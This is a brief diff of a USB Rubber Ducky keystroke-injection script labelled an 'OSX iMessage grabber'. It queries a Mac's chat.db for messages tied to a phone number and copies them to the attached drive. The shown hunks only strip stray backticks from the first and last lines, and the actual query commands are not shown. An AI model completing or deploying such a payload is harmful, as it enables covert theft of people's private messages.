@@ -1,4 +1,4 @@
-`REM OSX IMESSAGE GRABBER FOR TWIN DUCK 
+REM OSX IMESSAGE GRABBER FOR TWIN DUCK 
 REM this will query the chat.db based on a number give to it in the query
 REM Raymon Hardy
 REM You should replace MICRO in /Volumes/MICRO with your ducky name
@@ -52,4 +52,4 @@ ENTER
 DELAY 300
 COMMAND Q
 DELAY 500
-STRING diskutil umount /Volumes/MICRO`
+STRING diskutil umount /Volumes/MICRO
